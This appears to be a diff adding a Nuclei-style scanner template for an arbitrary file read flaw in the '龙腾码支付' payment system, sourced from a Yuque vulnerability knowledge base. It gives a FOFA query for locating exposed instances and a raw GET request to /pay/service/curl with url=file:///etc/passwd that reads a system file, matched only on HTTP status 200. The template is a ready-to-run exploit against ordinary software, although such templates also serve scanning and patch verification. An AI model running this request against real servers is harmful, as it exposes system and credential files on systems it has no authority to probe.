@@ -1,0 +1,19 @@
+id: poc-pvwxh8u6812pxcv3
+info:
+  name: 龙腾码支付 payservicecurl 任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pvwxh8u6812pxcv3'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: pvwxh8u6812pxcv3
+    fofa: body="/epaydoc/epaydoc.php"
+http:
+- raw:
+  - GET /pay/service/curl?url=file:///etc/passwd HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
